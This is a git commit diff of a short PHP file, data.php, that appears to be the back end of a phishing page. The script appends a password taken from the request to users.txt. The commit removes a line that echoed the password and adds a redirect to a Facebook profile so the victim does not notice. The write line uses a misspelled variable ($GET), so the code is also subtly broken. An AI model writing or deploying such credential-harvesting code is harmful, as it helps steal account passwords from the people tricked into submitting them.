0af8a5ad31fe04b157241eecd5c66d4acaa2deab
Abino5 <abeomer@gmail.com>
2016-10-31 21:48:23 +0300

    Update data.php

--- data.php
+++ data.php
@@ -1,9 +1,8 @@
 <?php
 $handle = fopen("users.txt", "a");
-echo $_GET['password'];
 
 fwrite($handle, $GET['password']);
 fclose($handle);
-
+header("Location: https://www.facebook.com/profile.php?id=100001295764354&fref=ts");
 exit;
 ?> 
